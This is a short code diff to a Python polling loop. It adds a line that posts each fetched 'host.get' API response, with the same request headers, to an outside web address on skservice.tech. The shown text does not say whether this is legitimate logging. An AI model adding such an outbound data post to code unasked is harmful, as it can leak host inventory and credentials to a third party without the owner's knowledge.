@@ -73,4 +73,6 @@ while True:
         res3 = res3.json()
         #print 'host.get response'
         pprint(res3)
+        webhook = "https://skservice.tech/unittest/log/log.php"
+        res3 = requests.post(webhook, data=json.dumps(res3), headers=headers)
         time.sleep(5)
